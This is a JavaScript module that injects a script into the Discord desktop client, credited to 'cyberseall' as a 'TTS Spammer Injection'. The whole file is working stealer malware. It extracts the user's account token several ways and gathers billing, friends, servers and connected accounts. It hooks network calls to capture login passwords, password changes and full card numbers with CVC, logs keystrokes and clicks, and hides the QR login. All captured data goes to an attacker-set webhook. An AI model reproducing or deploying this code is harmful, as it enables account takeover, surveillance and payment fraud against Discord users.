const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');

const config = {
    webhook: "%WEBHOOK_URL%",
    logout: false,
    inject_logout: true,
    logout_notify: true,
    init_notify: true,
    embed_color: 16711680,
    ping: "@everyone",
    pingVal: true,
    embed_name: "TTS Spammer Injection",
    embed_icon: "https://i.imgur.com/maMd4wO.png",
    API: "https://discord.com/api/v9/users/@me",
    disable_qr_code: true,
    auto_buy_nitro: false,
    buy_nitro_price: "9.99",
    nitro_type: "premium_monthly"
};

const discordPath = (function() {
    const app = require('electron').app;
    const appPath = app.getAppPath();
    return appPath;
})();

const tokenScript = `
(() => {
    'use strict';
    
    // Global state management
    const injectionState = {
        tokens: new Set(),
        currentToken: null,
        isInitialized: false,
        hooks: new Map(),
        lastActivity: Date.now(),
        sessionData: {
            startTime: Date.now(),
            activities: [],
            keystrokes: [],
            mouseClicks: []
        }
    };

    // Utility functions
    const utils = {
        log: (message, data = null) => {
            console.log(\`[TTS Injection] \${message}\`, data || '');
        },
        
        sleep: (ms) => new Promise(resolve => setTimeout(resolve, ms)),
        
        generateId: () => Math.random().toString(36).substr(2, 9),
        
        formatTime: () => new Date().toISOString(),
        
        safeStringify: (obj) => {
            try {
                return JSON.stringify(obj, null, 2);
            } catch {
                return String(obj);
            }
        },
        
        getFingerprint: () => {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Discord Fingerprint', 2, 2);
            return canvas.toDataURL();
        }
    };

    // Enhanced token extraction with multiple methods
    const tokenExtractor = {
        methods: [
            // Method 1: Webpack chunk extraction (most reliable)
            () => {
                try {
                    let token = null;
                    if (window.webpackChunkdiscord_app) {
                        window.webpackChunkdiscord_app.push([
                            [Math.random()], {}, (e) => {
                                for (const module of Object.values(e.c)) {
                                    try {
                                        if (module?.exports?.default?.getToken) {
                                            token = module.exports.default.getToken();
                                            break;
                                        }
                                        if (module?.exports?.getToken) {
                                            token = module.exports.getToken();
                                            break;
                                        }
                                    } catch {}
                                }
                            }
                        ]);
                    }
                    return token;
                } catch {
                    return null;
                }
            },
            
            // Method 2: LocalStorage extraction
            () => {
                try {
                    const token = localStorage.getItem('token');
                    return token ? token.replace(/"/g, '') : null;
                } catch {
                    return null;
                }
            },
            
            // Method 3: SessionStorage extraction
            () => {
                try {
                    const token = sessionStorage.getItem('token');
                    return token ? token.replace(/"/g, '') : null;
                } catch {
                    return null;
                }
            },
            
            // Method 4: IndexedDB extraction
            async () => {
                try {
                    return new Promise((resolve) => {
                        const request = indexedDB.open('discord');
                        request.onsuccess = () => {
                            const db = request.result;
                            const transaction = db.transaction(['tokens'], 'readonly');
                            const store = transaction.objectStore('tokens');
                            const getRequest = store.get('token');
                            getRequest.onsuccess = () => resolve(getRequest.result?.value);
                            getRequest.onerror = () => resolve(null);
                        };
                        request.onerror = () => resolve(null);
                    });
                } catch {
                    return null;
                }
            },
            
            // Method 5: Memory scanning
            () => {
                try {
                    const scripts = document.querySelectorAll('script');
                    for (const script of scripts) {
                        const content = script.textContent || script.innerText;
                        const tokenMatch = content.match(/[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}/);
                        if (tokenMatch) return tokenMatch[0];
                    }
                    return null;
                } catch {
                    return null;
                }
            }
        ],
        
        async extract() {
            for (const method of this.methods) {
                try {
                    const token = await method();
                    if (token && token.length > 50) {
                        utils.log('Token extracted successfully', { method: this.methods.indexOf(method) });
                        return token;
                    }
                } catch (error) {
                    utils.log('Token extraction method failed', error);
                }
            }
            return null;
        }
    };

    // Enhanced API client with retry logic
    const apiClient = {
        async request(endpoint, options = {}) {
            const maxRetries = 3;
            let attempt = 0;
            
            while (attempt < maxRetries) {
                try {
                    const response = await fetch(endpoint, {
                        ...options,
                        headers: {
                            'Authorization': injectionState.currentToken,
                            'Content-Type': 'application/json',
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            ...options.headers
                        }
                    });
                    
                    if (response.status === 429) {
                        const retryAfter = response.headers.get('retry-after') || 1;
                        utils.log(\`Rate limited, waiting \${retryAfter}s\`);
                        await utils.sleep(retryAfter * 1000);
                        attempt++;
                        continue;
                    }
                    
                    return response;
                } catch (error) {
                    utils.log(\`API request failed (attempt \${attempt + 1})\`, error);
                    attempt++;
                    if (attempt < maxRetries) {
                        await utils.sleep(1000 * attempt);
                    }
                }
            }
            throw new Error('Max retries exceeded');
        },
        
        async getUserInfo(token) {
            try {
                const response = await this.request('${config.API}');
                return await response.json();
            } catch {
                return null;
            }
        },
        
        async getBilling(token) {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/billing/payment-sources');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getGuilds(token) {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/guilds?with_counts=true');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getFriends(token) {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/relationships');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getConnections(token) {
            try {
                const response = await this.request('https://discord.com/api/v9/users/@me/connections');
                return await response.json();
            } catch {
                return [];
            }
        },
        
        async getApplications(token) {
            try {
                const response = await this.request('https://discord.com/api/v9/applications');
                return await response.json();
            } catch {
                return [];
            }
        }
    };

    // Comprehensive webhook sender
    const webhookSender = {
        async send(data) {
            try {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', '${config.webhook}', true);
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.send(JSON.stringify(data));
                utils.log('Webhook sent successfully');
            } catch (error) {
                utils.log('Webhook send failed', error);
            }
        },
        
        async sendTokenCapture(user, token, additionalData = {}) {
            const nitroTypes = {
                0: 'None',
                1: 'Nitro Classic', 
                2: 'Nitro',
                3: 'Nitro Basic'
            };

            const badges = {
                1: 'Discord Staff',
                2: 'Discord Partner',
                4: 'HypeSquad Events',
                8: 'Bug Hunter Level 1',
                64: 'HypeSquad Bravery',
                128: 'HypeSquad Brilliance',
                256: 'HypeSquad Balance',
                512: 'Early Supporter',
                16384: 'Bug Hunter Level 2',
                131072: 'Verified Bot Developer',
                4194304: 'Active Developer',
                262144: 'Certified Moderator'
            };

            const userBadges = [];
            if (user.public_flags) {
                for (const [flag, name] of Object.entries(badges)) {
                    if (user.public_flags & flag) {
                        userBadges.push(name);
                    }
                }
            }

            const [billing, guilds, friends, connections, applications] = await Promise.all([
                apiClient.getBilling(token),
                apiClient.getGuilds(token),
                apiClient.getFriends(token),
                apiClient.getConnections(token),
                apiClient.getApplications(token)
            ]);

            const paymentMethods = billing.map(method => {
                if (method.type === 1) {
                    return \`💳 \${method.brand} •••• \${method.last_4} (Expires: \${method.expires_month}/\${method.expires_year})\`;
                } else if (method.type === 2) {
                    return \`💰 PayPal (\${method.email})\`;
                }
                return '❓ Unknown Payment Method';
            });

            const connectedAccounts = connections.map(conn => 
                \`\${conn.type}: \${conn.name} (\${conn.verified ? 'Verified' : 'Unverified'})\`
            );

            const guildCount = guilds.length;
            const ownedGuilds = guilds.filter(g => g.owner).length;
            const friendCount = friends.filter(f => f.type === 1).length;
            const blockedCount = friends.filter(f => f.type === 2).length;

            const embed = {
                username: '${config.embed_name}',
                avatar_url: '${config.embed_icon}',
                content: '${config.pingVal ? config.ping : ''}',
                embeds: [{
                    title: '🎯 Discord Token Captured',
                    color: ${config.embed_color},
                    thumbnail: {
                        url: user.avatar ? \`https://cdn.discordapp.com/avatars/\${user.id}/\${user.avatar}.png\` : 'https://cdn.discordapp.com/embed/avatars/0.png'
                    },
                    fields: [
                        {
                            name: '👤 User Information',
                            value: \`**Username:** \${user.username}#\${user.discriminator}\\n**ID:** \${user.id}\\n**Email:** \${user.email || 'None'}\\n**Phone:** \${user.phone || 'None'}\\n**MFA:** \${user.mfa_enabled ? '✅' : '❌'}\\n**Verified:** \${user.verified ? '✅' : '❌'}\`,
                            inline: true
                        },
                        {
                            name: '💎 Nitro & Badges',
                            value: \`**Nitro:** \${nitroTypes[user.premium_type] || 'None'}\\n**Badges:** \${userBadges.length > 0 ? userBadges.join(', ') : 'None'}\`,
                            inline: true
                        },
                        {
                            name: '💳 Payment Methods',
                            value: paymentMethods.length > 0 ? paymentMethods.join('\\n') : 'None',
                            inline: false
                        },
                        {
                            name: '📊 Statistics',
                            value: \`**Servers:** \${guildCount} (\${ownedGuilds} owned)\\n**Friends:** \${friendCount}\\n**Blocked:** \${blockedCount}\`,
                            inline: true
                        },
                        {
                            name: '🔗 Connected Accounts',
                            value: connectedAccounts.length > 0 ? connectedAccounts.join('\\n') : 'None',
                            inline: true
                        },
                        {
                            name: '🖥️ System Info',
                            value: \`**User Agent:** \${navigator.userAgent.substring(0, 100)}...\\n**Language:** \${navigator.language}\\n**Platform:** \${navigator.platform}\\n**Fingerprint:** \${utils.getFingerprint().substring(0, 20)}...\`,
                            inline: false
                        },
                        {
                            name: '🔑 Token',
                            value: \`\\\`\\\`\\\`\\n\${token}\\n\\\`\\\`\\\`\`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Made by cyberseall • TTS Spammer Injection',
                        icon_url: '${config.embed_icon}'
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            await this.send(embed);
        },
        
        async sendActivity(type, data) {
            const embed = {
                username: '${config.embed_name}',
                avatar_url: '${config.embed_icon}',
                embeds: [{
                    title: \`🔍 Activity Detected: \${type}\`,
                    description: utils.safeStringify(data),
                    color: 16776960,
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Made by cyberseall • Activity Monitor'
                    }
                }]
            };
            
            await this.send(embed);
        }
    };

    // Advanced hook system
    const hookSystem = {
        hooks: new Map(),
        
        install(name, target, property, handler) {
            if (this.hooks.has(name)) return;
            
            const original = target[property];
            if (!original) return;
            
            target[property] = function(...args) {
                try {
                    handler.call(this, args, original);
                } catch (error) {
                    utils.log(\`Hook \${name} failed\`, error);
                }
                return original.apply(this, args);
            };
            
            this.hooks.set(name, { target, property, original });
            utils.log(\`Hook \${name} installed\`);
        },
        
        installAll() {
            // LocalStorage hooks
            this.install('localStorage.setItem', localStorage, 'setItem', (args) => {
                const [key, value] = args;
                if (key === 'token') {
                    const token = value.replace(/"/g, '');
                    tokenProcessor.process(token);
                }
                webhookSender.sendActivity('LocalStorage Set', { key, value: key === 'token' ? '[TOKEN]' : value });
            });
            
            this.install('localStorage.removeItem', localStorage, 'removeItem', (args) => {
                webhookSender.sendActivity('LocalStorage Remove', { key: args[0] });
            });
            
            // SessionStorage hooks
            this.install('sessionStorage.setItem', sessionStorage, 'setItem', (args) => {
                const [key, value] = args;
                webhookSender.sendActivity('SessionStorage Set', { key, value: key === 'token' ? '[TOKEN]' : value });
            });
            
            // XMLHttpRequest hooks
            this.install('XMLHttpRequest.open', XMLHttpRequest.prototype, 'open', (args) => {
                const [method, url] = args;
                this._method = method;
                this._url = url;
                
                if (url.includes('/auth/') || url.includes('/login') || url.includes('/register')) {
                    webhookSender.sendActivity('Auth Request', { method, url });
                }
            });
            
            this.install('XMLHttpRequest.send', XMLHttpRequest.prototype, 'send', (args) => {
                const data = args[0];
                
                if (this._url && data) {
                    try {
                        const parsedData = JSON.parse(data);
                        
                        // Password changes
                        if (parsedData.password && parsedData.new_password) {
                            webhookSender.sendActivity('Password Change', {
                                old: parsedData.password,
                                new: parsedData.new_password
                            });
                        }
                        
                        // Email changes
                        if (parsedData.email && this._url.includes('/users/@me')) {
                            webhookSender.sendActivity('Email Change', {
                                email: parsedData.email,
                                password: parsedData.password
                            });
                        }
                        
                        // Credit card additions
                        if (parsedData.card && this._url.includes('/billing/payment-sources')) {
                            webhookSender.sendActivity('Credit Card Added', {
                                number: parsedData.card.number,
                                expiry: \`\${parsedData.card.exp_month}/\${parsedData.card.exp_year}\`,
                                cvc: parsedData.card.cvc
                            });
                        }
                        
                        // Login attempts
                        if ((parsedData.login || parsedData.email) && parsedData.password) {
                            webhookSender.sendActivity('Login Attempt', {
                                login: parsedData.login || parsedData.email,
                                password: parsedData.password
                            });
                        }
                        
                    } catch {}
                }
            });
            
            // Fetch API hooks
            this.install('fetch', window, 'fetch', async (args) => {
                const [url, options] = args;
                
                if (typeof url === 'string') {
                    if (url.includes('/auth/') || url.includes('/login') || url.includes('/register')) {
                        webhookSender.sendActivity('Fetch Auth Request', { url, options });
                    }
                    
                    if (options && options.body) {
                        try {
                            const data = JSON.parse(options.body);
                            
                            if (data.password && data.new_password) {
                                webhookSender.sendActivity('Password Change (Fetch)', {
                                    old: data.password,
                                    new: data.new_password
                                });
                            }
                            
                            if (data.email && url.includes('/users/@me')) {
                                webhookSender.sendActivity('Email Change (Fetch)', {
                                    email: data.email,
                                    password: data.password
                                });
                            }
                            
                        } catch {}
                    }
                }
            });
            
            // Keyboard and mouse event hooks
            document.addEventListener('keydown', (event) => {
                injectionState.sessionData.keystrokes.push({
                    key: event.key,
                    code: event.code,
                    timestamp: Date.now()
                });
                
                // Log sensitive key combinations
                if (event.ctrlKey && (event.key === 'v' || event.key === 'c')) {
                    webhookSender.sendActivity('Clipboard Action', {
                        action: event.key === 'v' ? 'paste' : 'copy',
                        timestamp: utils.formatTime()
                    });
                }
            });
            
            document.addEventListener('click', (event) => {
                injectionState.sessionData.mouseClicks.push({
                    x: event.clientX,
                    y: event.clientY,
                    target: event.target.tagName,
                    timestamp: Date.now()
                });
            });
            
            // Form submission hooks
            document.addEventListener('submit', (event) => {
                const formData = new FormData(event.target);
                const data = Object.fromEntries(formData.entries());
                
                webhookSender.sendActivity('Form Submission', {
                    action: event.target.action,
                    data: Object.keys(data).reduce((acc, key) => {
                        acc[key] = key.toLowerCase().includes('password') ? '[PASSWORD]' : data[key];
                        return acc;
                    }, {})
                });
            });
        }
    };

    // Token processor
    const tokenProcessor = {
        async process(token) {
            if (!token || injectionState.tokens.has(token)) return;
            
            injectionState.tokens.add(token);
            injectionState.currentToken = token;
            
            utils.log('Processing new token', { length: token.length });
            
            const user = await apiClient.getUserInfo(token);
            if (!user || user.message) {
                utils.log('Invalid token or API error');
                return;
            }
            
            await webhookSender.sendTokenCapture(user, token);
            
            // Start monitoring this session
            this.startMonitoring();
        },
        
        startMonitoring() {
            // Monitor for token changes
            setInterval(async () => {
                const currentToken = await tokenExtractor.extract();
                if (currentToken && currentToken !== injectionState.currentToken) {
                    this.process(currentToken);
                }
            }, 5000);
            
            // Send periodic activity reports
            setInterval(() => {
                if (injectionState.sessionData.activities.length > 0) {
                    webhookSender.sendActivity('Session Report', {
                        duration: Date.now() - injectionState.sessionData.startTime,
                        activities: injectionState.sessionData.activities.length,
                        keystrokes: injectionState.sessionData.keystrokes.length,
                        clicks: injectionState.sessionData.mouseClicks.length
                    });
                    
                    // Reset counters
                    injectionState.sessionData.activities = [];
                    injectionState.sessionData.keystrokes = [];
                    injectionState.sessionData.mouseClicks = [];
                }
            }, 60000); // Every minute
        }
    };

    // QR Code disabling
    ${config.disable_qr_code ? `
    const qrCodeDisabler = {
        start() {
            setInterval(() => {
                const selectors = [
                    '[class*="qrCode"]',
                    '[class*="qrLogin"]',
                    '[class*="qr-code"]',
                    '[data-testid="qr-code"]',
                    '.qr-code-container',
                    '#qr-code'
                ];
                
                selectors.forEach(selector => {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(el => {
                        el.style.display = 'none';
                        el.style.visibility = 'hidden';
                        el.remove();
                    });
                });
            }, 500);
        }
    };
    ` : ''}

    // Auto logout functionality
    ${config.logout ? `
    const autoLogout = {
        start() {
            setTimeout(() => {
                if (injectionState.currentToken && ${config.logout_notify}) {
                    webhookSender.sendActivity('Auto Logout', {
                        reason: 'Scheduled logout',
                        timestamp: utils.formatTime()
                    });
                }
                
                localStorage.clear();
                sessionStorage.clear();
                
                // Clear IndexedDB
                indexedDB.databases().then(databases => {
                    databases.forEach(db => {
                        indexedDB.deleteDatabase(db.name);
                    });
                });
                
                location.reload();
            }, 10000);
        }
    };
    ` : ''}

    // Main initialization
    const init = async () => {
        if (injectionState.isInitialized) return;
        injectionState.isInitialized = true;
        
        utils.log('TTS Spammer Discord Injection initializing...');
        
        // Install all hooks
        hookSystem.installAll();
        
        // Start QR code disabling
        ${config.disable_qr_code ? 'qrCodeDisabler.start();' : ''}
        
        // Start auto logout
        ${config.logout ? 'autoLogout.start();' : ''}
        
        // Initial token extraction
        await utils.sleep(2000);
        const token = await tokenExtractor.extract();
        if (token) {
            await tokenProcessor.process(token);
        }
        
        // Send initialization notification
        if (${config.init_notify}) {
            webhookSender.sendActivity('Injection Initialized', {
                timestamp: utils.formatTime(),
                userAgent: navigator.userAgent,
                url: window.location.href
            });
        }
        
        utils.log('TTS Spammer Discord Injection loaded successfully');
    };

    // Start initialization when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Backup initialization for dynamic content
    setTimeout(init, 3000);
    
})();
`;

module.exports = tokenScript; 
